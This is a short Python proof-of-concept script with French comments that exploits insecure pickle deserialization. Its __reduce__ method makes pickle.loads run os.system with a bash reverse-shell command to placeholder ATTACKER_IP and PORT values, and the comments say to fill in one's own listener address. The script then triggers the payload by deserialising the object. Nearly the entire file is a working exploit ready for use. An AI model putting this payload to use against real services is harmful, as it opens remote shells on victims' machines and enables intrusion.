import pickle
import os

class MaliciousCode(object):
    def __reduce__(self):
        """
        __reduce__ : This special method is used by pickle to determine how an
        object should be deserialized. Here, the method returns a tuple containing
        the function os.system and the argument for creating a reverse shell.
        This will execute the command on deserialization.
        """
        # Remplacer "ATTACKER_IP" par ton adresse IP et "PORT" par ton port d'écoute
        return (os.system, ('bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1',))

# Sérialisation de l'objet malveillant
packet = pickle.dumps(MaliciousCode())

# Simulation de la désérialisation côté serveur (ceci déclenche l'exécution de la commande)
pickle.loads(packet)
